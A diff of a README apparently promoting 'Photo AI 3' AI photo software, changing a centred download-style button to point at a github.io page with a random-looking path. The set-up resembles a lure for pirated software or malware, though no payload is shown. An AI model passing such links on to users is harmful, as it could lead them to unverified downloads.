@@ -8,7 +8,7 @@
 
 Photo AI 3 is a standalone or plugin software that enhances, denoises, sharpens, upscales, and removes objects from your photos with artificial intelligence. See how Photo AI 3 can perfect every pixel, balance color, and create stunning images from low light, motion blur, or pixelated faces.
 
-<div align="center"><a href="https://.github.io/id/"><img src="https://github.com/user-attachments/assets/d356c66a-e752-4f96-bfab-44cdd6305090" height="80"></a></div>
+<div align="center"><a href="https://sylivo.github.io/id/jgf78dgsf76"><img src="https://github.com/user-attachments/assets/d356c66a-e752-4f96-bfab-44cdd6305090" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
